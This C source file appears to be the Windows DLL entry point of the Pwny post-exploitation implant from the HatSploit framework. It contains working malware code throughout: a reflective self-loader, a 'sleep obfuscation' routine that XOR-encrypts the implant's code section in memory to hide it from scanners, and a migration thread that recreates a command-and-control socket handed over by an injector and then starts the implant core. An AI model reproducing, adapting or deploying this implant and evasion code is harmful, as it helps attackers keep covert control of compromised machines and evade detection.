/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <winsock2.h>
#include <windows.h>

#include <pwny/core.h>
#include <pwny/misc.h>
#include <pwny/log.h>

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }
#define SELF_LOADER_CUSTOM_DLLMAIN

#include "self_loader.c"

/* ------------------------------------------------------------------ */
/* Sleep obfuscation — encrypt code section during idle periods        */
/* ------------------------------------------------------------------ */

/* Context passed to the external obfuscation stub (must match the
 * layout in obfuscate_x64.S). */
typedef struct __attribute__((packed))
{
    UINT_PTR pfnSleep;           /* +0x00 */
    UINT_PTR pfnVirtualProtect;  /* +0x08 */
    UINT_PTR text_base;          /* +0x10 */
    SIZE_T   text_size;          /* +0x18 — QWORD-aligned */
    UINT64   xor_key;            /* +0x20 */
    DWORD    interval_ms;        /* +0x28 — normal operation interval */
    DWORD    obfuscation_ms;     /* +0x2C — encrypted sleep duration */
    volatile LONG stop_flag;     /* +0x30 — nonzero = exit loop */
} obf_context_t;

/* Linker symbols from obfuscate_x64.S */
extern unsigned char obfuscate_x64_start[];
extern unsigned char obfuscate_x64_end[];

static obf_context_t *g_obf_ctx;

/*
 * start_sleep_obfuscation — copies the obfuscation stub to a
 * VirtualAlloc region outside the PE image, sets up the context,
 * and starts a background thread.
 *
 * The stub periodically:
 *   1. VirtualProtect(.text, RW)
 *   2. XOR-encrypts the code section
 *   3. Sleeps (image hidden from scanners)
 *   4. XOR-decrypts
 *   5. VirtualProtect(.text, RX)
 *
 * NOTE: no thread suspension is performed before encryption.
 * The XOR loop over ~800 KB completes in sub-millisecond time,
 * so the race window with other threads is negligible.
 */

static void start_sleep_obfuscation(HINSTANCE hinstDLL)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER sec;
    WORD numSections, i;
    LPVOID text_base = NULL;
    SIZE_T text_size = 0;
    SIZE_T stub_size;
    LPVOID stub_mem;
    obf_context_t *ctx;
    HMODULE hKernel32;
    DWORD oldProt;

    dos = (PIMAGE_DOS_HEADER)hinstDLL;
    nt  = (PIMAGE_NT_HEADERS)((BYTE *)hinstDLL + dos->e_lfanew);
    sec = IMAGE_FIRST_SECTION(nt);
    numSections = nt->FileHeader.NumberOfSections;

    /* Find the first executable section (.text) */

    for (i = 0; i < numSections; i++)
    {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
        {
            text_base = (BYTE *)hinstDLL + sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            text_size = (text_size + 7) & ~(SIZE_T)7; /* QWORD-align */
            break;
        }
    }

    if (text_base == NULL || text_size == 0)
        return;

    /* Allocate RX region for the obfuscation stub (external to PE) */

    stub_size = (SIZE_T)(obfuscate_x64_end - obfuscate_x64_start);

    stub_mem = VirtualAlloc(NULL, stub_size,
                            MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (stub_mem == NULL)
        return;

    memcpy(stub_mem, obfuscate_x64_start, stub_size);
    VirtualProtect(stub_mem, stub_size, PAGE_EXECUTE_READ, &oldProt);

    /* Allocate RW context (separate from stub to avoid RWX) */

    ctx = (obf_context_t *)VirtualAlloc(NULL, sizeof(*ctx),
                                        MEM_RESERVE | MEM_COMMIT,
                                        PAGE_READWRITE);
    if (ctx == NULL)
        return;

    hKernel32 = GetModuleHandleA("kernel32.dll");

    ctx->pfnSleep          = (UINT_PTR)GetProcAddress(hKernel32, "Sleep");
    ctx->pfnVirtualProtect = (UINT_PTR)GetProcAddress(hKernel32, "VirtualProtect");
    ctx->text_base         = (UINT_PTR)text_base;
    ctx->text_size         = text_size;
    ctx->xor_key           = 0xDEADBEEFCAFEBABEULL;
    ctx->interval_ms       = 30000;  /* 30 s normal operation */
    ctx->obfuscation_ms    = 200;    /* 200 ms encrypted */
    ctx->stop_flag         = 0;

    g_obf_ctx = ctx;

    /* Start the obfuscation thread — runs entirely from stub_mem */

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)stub_mem,
                 ctx, 0, NULL);
}

DWORD Init(int sock)
{
    char *uri;
    core_t *core;

    InitAppInstance();
    core = core_create();

    if (core == NULL)
    {
        log_debug("* Failed to initialize core\n");
        return 1;
    }

    core_setup(core);
    core->flags |= CORE_INJECTED;

    if (asprintf(&uri, "sock://%d", sock) > 0)
    {
        core_add_uri(core, uri);
        free(uri);
    }

    core_start(core);
    core_destroy(core);

    return 0;
}

static DWORD WINAPI MigrateThread(LPVOID lpParam)
{
    WSAPROTOCOL_INFOW *pInfo = (WSAPROTOCOL_INFOW *)lpParam;
    WSAPROTOCOL_INFOW info;
    WSADATA wsaData;
    SOCKET sock;
    DWORD result;

    /* Copy protocol info locally before freeing the remote buffer. */
    memcpy(&info, pInfo, sizeof(info));
    VirtualFree(pInfo, 0, MEM_RELEASE);

    /* Give the old process time to send its QUIT response
     * and release the socket before we start I/O on it. */
    Sleep(500);

    /* Initialize Winsock and recreate the socket from the
     * WSAPROTOCOL_INFOW that the injector exported via
     * WSADuplicateSocketW. */
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    sock = WSASocketW(info.iAddressFamily, info.iSocketType,
                      info.iProtocol, &info, 0, 0);
    if (sock == INVALID_SOCKET)
    {
        WSACleanup();
        return 1;
    }

    result = Init((int)sock);
    WSACleanup();
    return result;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_HATSPLOIT_ATTACH:
		bReturnValue = Init((int)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE*)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		/* Start sleep obfuscation BEFORE the headers are stomped
		 * (STEP 9 in _DllInit runs after DllMain returns).
		 * The obfuscation thread needs the PE headers to locate the
		 * .text section boundaries. */
		start_sleep_obfuscation(hinstDLL);

		/* The stager passes a pointer to a WSAPROTOCOL_INFOW struct
		 * (allocated in this process by the injector) through
		 * _DllInit → DllMain lpReserved.  MigrateThread recreates
		 * the C2 socket via WSASocketW from that protocol info. */
		if (lpReserved != NULL)
		{
			CreateThread(NULL, 0, MigrateThread,
			             (LPVOID)lpReserved, 0, NULL);
		}
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}